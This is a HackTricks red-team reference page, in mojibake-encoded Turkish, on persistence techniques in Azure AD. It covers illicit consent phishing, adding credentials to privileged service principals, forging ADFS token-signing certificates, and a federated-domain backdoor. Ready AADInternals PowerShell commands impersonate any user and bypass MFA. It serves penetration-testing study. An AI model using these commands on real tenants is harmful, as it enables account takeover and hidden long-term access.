# Az - Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### YasadÄ±ÅŸÄ± Ä°zin Verme

VarsayÄ±lan olarak, herhangi bir kullanÄ±cÄ± Azure AD'de bir uygulama kaydedebilir. Bu nedenle, yÃ¼ksek etki izinlerine ihtiyaÃ§ duyan (ve eÄŸer admin iseniz onaylayabileceÄŸiniz) bir uygulama kaydedebilirsiniz - Ã¶rneÄŸin, bir kullanÄ±cÄ±nÄ±n adÄ±na mail gÃ¶ndermek, rol yÃ¶netimi vb. Bu, baÅŸarÄ±lÄ± olursa **oltalama saldÄ±rÄ±larÄ±** gerÃ§ekleÅŸtirmemizi saÄŸlayacaktÄ±r ki bu da Ã§ok **verimli** olacaktÄ±r.

AyrÄ±ca, bu uygulamayÄ± kullanÄ±cÄ± olarak kabul ederek ona eriÅŸimi sÃ¼rdÃ¼rmeyi de kabul edebilirsiniz.

### Uygulamalar ve Servis Prensipleri

Uygulama YÃ¶neticisi, GA veya microsoft.directory/applications/credentials/update izinlerine sahip Ã¶zel bir rol ile, mevcut bir uygulamaya kimlik bilgileri (gizli anahtar veya sertifika) ekleyebiliriz.

**YÃ¼ksek izinlere sahip bir uygulamayÄ± hedef almak** veya **yÃ¼ksek izinlere sahip yeni bir uygulama eklemek** mÃ¼mkÃ¼ndÃ¼r.

Uygulamaya eklemek iÃ§in ilginÃ§ bir rol, **AyrÄ±calÄ±klÄ± kimlik doÄŸrulama yÃ¶neticisi rolÃ¼** olacaktÄ±r Ã§Ã¼nkÃ¼ bu, KÃ¼resel YÃ¶neticilerin **ÅŸifresini sÄ±fÄ±rlama** yetkisi verir.

Bu teknik ayrÄ±ca **MFA'yÄ± atlamayÄ±** da saÄŸlar.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Sertifika tabanlÄ± kimlik doÄŸrulama iÃ§in

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federation - Token Signing Certificate

On-prem AD Ã¼zerinde **DA ayrÄ±calÄ±klarÄ±** ile, Ã§ok uzun geÃ§erlilik sÃ¼resine sahip **yeni Token signing** ve **Token Decrypt sertifikalarÄ±** oluÅŸturmak ve iÃ§e aktarmak mÃ¼mkÃ¼ndÃ¼r. Bu, bildiÄŸimiz herhangi bir kullanÄ±cÄ±nÄ±n ImuutableID'si ile **giriÅŸ yapmamÄ±za** olanak tanÄ±yacaktÄ±r.

**AÅŸaÄŸÄ±daki komutu** **ADFS sunucusunda DA olarak** Ã§alÄ±ÅŸtÄ±rarak yeni sertifikalar oluÅŸturun (varsayÄ±lan ÅŸifre 'AADInternals'), bunlarÄ± ADFS'ye ekleyin, otomatik yenilemeyi devre dÄ±ÅŸÄ± bÄ±rakÄ±n ve hizmeti yeniden baÅŸlatÄ±n:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Sonra, sertifika bilgilerini Azure AD ile gÃ¼ncelleyin:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federation - GÃ¼venilir Alan

GA ayrÄ±calÄ±klarÄ± ile bir kiracÄ±da, **yeni bir alan eklemek** mÃ¼mkÃ¼ndÃ¼r (doÄŸrulanmasÄ± gerekir), kimlik doÄŸrulama tÃ¼rÃ¼nÃ¼ Federated olarak yapÄ±landÄ±rmak ve alanÄ± **belirli bir sertifikaya** (aÅŸaÄŸÄ±daki komutta any.sts) ve vericiye gÃ¼venecek ÅŸekilde yapÄ±landÄ±rmak mÃ¼mkÃ¼ndÃ¼r:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Referanslar

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
